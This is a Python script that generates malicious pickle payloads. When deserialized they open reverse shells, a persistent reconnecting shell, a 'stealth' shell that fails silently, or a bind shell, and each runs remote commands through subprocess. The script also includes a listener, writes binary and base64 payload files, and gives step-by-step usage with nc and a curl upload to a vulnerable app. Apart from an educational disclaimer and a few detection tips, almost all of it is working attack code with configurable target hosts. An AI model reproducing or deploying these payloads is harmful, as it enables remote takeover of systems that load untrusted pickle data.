#!/usr/bin/env python3
"""
Reverse Shell Pickle Exploit
This script demonstrates how to create malicious pickle payloads that establish
reverse shell connections when deserialized.

WARNING: For educational purposes only. Use only on systems you own.
"""

import pickle
import base64
import socket
import subprocess
import threading
import time
import sys
from pathlib import Path


class BasicReverseShell:
    """Basic reverse shell that connects back to attacker"""

    def __init__(self, host="127.0.0.1", port=4444):
        self.host = host
        self.port = port

    def __reduce__(self):
        def create_reverse_shell(host, port):
            def shell():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((host, port))

                    # Send initial banner
                    banner = f"üêö Reverse shell connected from pickle exploit\n"
                    banner += f"Host: {socket.gethostname()}\n"
                    banner += (
                        f"User: {__import__('os').environ.get('USER', 'unknown')}\n"
                    )
                    banner += f"PWD: {__import__('os').getcwd()}\n"
                    banner += "Type 'exit' to close connection\n\n"
                    s.send(banner.encode())

                    while True:
                        try:
                            # Receive command
                            s.send(b"shell> ")
                            command = s.recv(1024).decode().strip()

                            if command.lower() in ["exit", "quit"]:
                                s.send(b"Connection closed\n")
                                break

                            if command:
                                try:
                                    # Execute command
                                    result = subprocess.run(
                                        command,
                                        shell=True,
                                        capture_output=True,
                                        text=True,
                                        timeout=30,
                                    )

                                    output = result.stdout
                                    if result.stderr:
                                        output += f"\nSTDERR:\n{result.stderr}"

                                    if not output:
                                        output = f"Command executed (return code: {result.returncode})\n"

                                    s.send(output.encode() + b"\n")

                                except subprocess.TimeoutExpired:
                                    s.send(b"Command timeout (30s limit)\n")
                                except Exception as e:
                                    s.send(
                                        f"Error executing command: {str(e)}\n".encode()
                                    )

                        except socket.timeout:
                            break
                        except Exception as e:
                            print(f"Shell error: {e}")
                            break

                    s.close()

                except Exception as e:
                    print(f"Reverse shell error: {e}")

            # Run shell in background thread
            thread = threading.Thread(target=shell, daemon=True)
            thread.start()

            return f"Reverse shell connecting to {host}:{port}"

        return (create_reverse_shell, (self.host, self.port))


class PersistentReverseShell:
    """Reverse shell that attempts to reconnect if connection fails"""

    def __init__(self, host="127.0.0.1", port=4444, retry_interval=60):
        self.host = host
        self.port = port
        self.retry_interval = retry_interval

    def __reduce__(self):
        def create_persistent_shell(host, port, retry_interval):
            def persistent_shell():
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(10)
                        s.connect((host, port))

                        # Send connection info
                        info = f"üîÑ Persistent shell connected\n"
                        info += f"Time: {time.ctime()}\n"
                        info += f"PID: {__import__('os').getpid()}\n\n"
                        s.send(info.encode())

                        # Handle commands
                        while True:
                            try:
                                command = s.recv(1024).decode().strip()
                                if command.lower() in ["exit", "quit"]:
                                    return

                                if command:
                                    result = subprocess.run(
                                        command,
                                        shell=True,
                                        capture_output=True,
                                        text=True,
                                    )
                                    output = (
                                        result.stdout or result.stderr or "No output"
                                    )
                                    s.send(output.encode() + b"\n")

                            except:
                                break

                        s.close()

                    except:
                        # Connection failed, wait and retry
                        time.sleep(retry_interval)

            # Start persistent shell in background
            thread = threading.Thread(target=persistent_shell, daemon=True)
            thread.start()

            return f"Persistent reverse shell started (target: {host}:{port})"

        return (create_persistent_shell, (self.host, self.port, self.retry_interval))


class BindShell:
    """Creates a bind shell that listens on a local port"""

    def __init__(self, port=8888):
        self.port = port

    def __reduce__(self):
        def create_bind_shell(port):
            def bind_shell():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind(("0.0.0.0", port))
                    s.listen(1)

                    print(f"üéØ Bind shell listening on port {port}")

                    while True:
                        try:
                            client, addr = s.accept()
                            print(f"üìû Connection from {addr}")

                            # Send banner
                            banner = f"üêö Bind shell access granted\n"
                            banner += f"Connected from: {addr}\n\n"
                            client.send(banner.encode())

                            while True:
                                try:
                                    client.send(b"bind> ")
                                    command = client.recv(1024).decode().strip()

                                    if command.lower() in ["exit", "quit"]:
                                        client.send(b"Goodbye\n")
                                        break

                                    if command:
                                        result = subprocess.run(
                                            command,
                                            shell=True,
                                            capture_output=True,
                                            text=True,
                                        )
                                        output = (
                                            result.stdout
                                            or result.stderr
                                            or "No output"
                                        )
                                        client.send(output.encode() + b"\n")

                                except:
                                    break

                            client.close()

                        except Exception as e:
                            print(f"Bind shell client error: {e}")

                except Exception as e:
                    print(f"Bind shell error: {e}")

            # Start bind shell in background
            thread = threading.Thread(target=bind_shell, daemon=True)
            thread.start()

            return f"Bind shell started on port {port}"

        return (create_bind_shell, (self.port,))


class StealthShell:
    """A more stealthy reverse shell with basic obfuscation"""

    def __init__(self, host="127.0.0.1", port=4444):
        self.host = host
        self.port = port

    def __reduce__(self):
        def create_stealth_shell(host, port):
            # Obfuscated shell function
            exec_func = __import__("subprocess").run
            sock_mod = __import__("socket")
            thread_mod = __import__("threading")
            time_mod = __import__("time")

            def stealth():
                try:
                    # Create connection with minimal logging
                    s = sock_mod.socket(sock_mod.AF_INET, sock_mod.SOCK_STREAM)
                    s.connect((host, port))

                    # Minimal banner
                    s.send(b"Connected\n")

                    while True:
                        try:
                            data = s.recv(1024)
                            if not data:
                                break

                            cmd = data.decode().strip()
                            if cmd == "exit":
                                break

                            # Execute without much error handling to stay quiet
                            try:
                                result = exec_func(
                                    cmd, shell=True, capture_output=True, text=True
                                )
                                output = result.stdout + result.stderr
                                s.send((output or "OK").encode() + b"\n")
                            except:
                                s.send(b"Error\n")

                        except:
                            break

                    s.close()
                except:
                    pass  # Fail silently

            thread_mod.Thread(target=stealth, daemon=True).start()
            return "Background task started"

        return (create_stealth_shell, (self.host, self.port))


def create_listener_helper():
    """Create a simple listener for testing reverse shells"""

    def start_listener(port=4444):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", port))
            s.listen(1)

            print(f"üéß Listening for reverse shells on port {port}")
            print("Waiting for connection...")

            client, addr = s.accept()
            print(f"‚úÖ Connection received from {addr}")

            try:
                while True:
                    data = client.recv(1024)
                    if not data:
                        break
                    print(data.decode(), end="")

                    # Simple interactive mode
                    try:
                        command = input()
                        client.send((command + "\n").encode())
                        if command.lower() in ["exit", "quit"]:
                            break
                    except (KeyboardInterrupt, EOFError):
                        break

            except Exception as e:
                print(f"Error in communication: {e}")

            finally:
                client.close()
                s.close()
                print("Connection closed")

        except Exception as e:
            print(f"Listener error: {e}")

    return start_listener


def demonstrate_reverse_shells():
    """Demonstrate various reverse shell payloads"""

    print("üêö REVERSE SHELL PICKLE EXPLOITS")
    print("=" * 50)
    print("‚ö†Ô∏è  WARNING: Educational purposes only!")
    print("   Use only on systems you own or have permission to test.")
    print("=" * 50)

    # Create output directory
    output_dir = (
        Path("../payloads") if Path("../payloads").exists() else Path("payloads")
    )
    output_dir.mkdir(exist_ok=True)

    # Define different shell types
    shells = [
        ("Basic Reverse Shell", BasicReverseShell("127.0.0.1", 4444)),
        ("Persistent Shell", PersistentReverseShell("127.0.0.1", 4445, 30)),
        ("Bind Shell", BindShell(8888)),
        ("Stealth Shell", StealthShell("127.0.0.1", 4446)),
        ("Custom Port Shell", BasicReverseShell("127.0.0.1", 9999)),
    ]

    print("\nüì¶ GENERATING REVERSE SHELL PAYLOADS:")
    print("-" * 45)

    for name, shell_obj in shells:
        print(f"\nüéØ {name}")

        # Create payload
        payload = pickle.dumps(shell_obj)

        # Save binary payload
        filename = output_dir / f"shell_{name.lower().replace(' ', '_')}.pkl"
        with open(filename, "wb") as f:
            f.write(payload)
        print(f"üíæ Binary payload: {filename}")

        # Save base64 payload
        b64_payload = base64.b64encode(payload).decode("utf-8")
        b64_filename = output_dir / f"shell_{name.lower().replace(' ', '_')}_base64.txt"
        with open(b64_filename, "w") as f:
            f.write(b64_payload)
        print(f"üìÑ Base64 payload: {b64_filename}")
        print(f"üìè Size: {len(payload)} bytes")
        print(f"üîç Preview: {b64_payload[:60]}...")

    print(f"\n‚úÖ All reverse shell payloads saved to '{output_dir}'")

    print("\nüß™ TESTING INSTRUCTIONS:")
    print("1. Start a listener (in another terminal):")
    print("   nc -lvp 4444")
    print("   # Or use the built-in listener:")
    print("   python reverse_shell.py --listen 4444")
    print("\n2. Start the vulnerable app:")
    print("   python vulnerable_app.py")
    print("\n3. Upload shell payload:")
    print(
        "   curl -X POST -F 'pickle_file=@payloads/shell_basic_reverse_shell.pkl' http://127.0.0.1:5000/process_pickle"
    )
    print("\n4. Check your listener for the connection!")

    print("\nüîç DETECTION TIPS:")
    print("- Monitor for unexpected network connections")
    print("- Watch for new listening ports (bind shells)")
    print("- Check for unusual process spawning")
    print("- Monitor subprocess execution patterns")
    print("- Look for connections to external hosts")


def create_custom_shell(host, port, shell_type="basic"):
    """Create a custom reverse shell payload"""

    if shell_type == "basic":
        shell = BasicReverseShell(host, port)
    elif shell_type == "persistent":
        shell = PersistentReverseShell(host, port)
    elif shell_type == "bind":
        shell = BindShell(port)
    elif shell_type == "stealth":
        shell = StealthShell(host, port)
    else:
        print(f"‚ùå Unknown shell type: {shell_type}")
        return None

    payload = pickle.dumps(shell)
    b64_payload = base64.b64encode(payload).decode("utf-8")

    print(f"üéØ Created {shell_type} shell payload")
    print(f"üì° Target: {host}:{port}")
    print(f"üì¶ Binary size: {len(payload)} bytes")
    print(f"üìÑ Base64 payload:")
    print(b64_payload)

    return payload


def main():
    """Main function"""
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            print("Reverse Shell Pickle Exploit Generator")
            print("\nUsage:")
            print(
                "  python reverse_shell.py                                    # Generate all payloads"
            )
            print(
                "  python reverse_shell.py --listen <port>                    # Start listener"
            )
            print(
                "  python reverse_shell.py <host> <port> [type]               # Create custom shell"
            )
            print("\nShell types: basic, persistent, bind, stealth")
            print("\nExamples:")
            print("  python reverse_shell.py --listen 4444")
            print("  python reverse_shell.py 127.0.0.1 4444 basic")
            print("  python reverse_shell.py 192.168.1.100 9999 persistent")
            print("  python reverse_shell.py 127.0.0.1 8888 bind")

        elif sys.argv[1] == "--listen":
            port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
            listener = create_listener_helper()
            listener(port)

        elif len(sys.argv) >= 3:
            host = sys.argv[1]
            port = int(sys.argv[2])
            shell_type = sys.argv[3] if len(sys.argv) > 3 else "basic"
            create_custom_shell(host, port, shell_type)

        else:
            print("‚ùå Invalid arguments. Use --help for usage information.")

    else:
        demonstrate_reverse_shells()


if __name__ == "__main__":
    main()
